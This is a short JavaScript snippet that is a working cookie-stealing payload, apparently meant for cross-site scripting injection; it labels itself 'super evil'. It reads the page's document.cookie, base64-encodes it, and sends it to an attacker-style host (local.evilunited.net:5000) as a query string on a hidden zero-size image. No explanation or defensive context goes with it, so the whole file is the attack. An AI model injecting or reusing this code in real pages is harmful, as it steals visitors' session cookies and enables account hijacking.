console.log("i'm super evil");

var cookies = document.cookie;
var encodedCookies = btoa(cookies);

var img = document.createElement('img');
img.width = 0;
img.height = 0
img.style.display = 'none';
img.src = 'http://local.evilunited.net:5000/static/img.png?cache=' + encodedCookies;
document.body.appendChild(img);
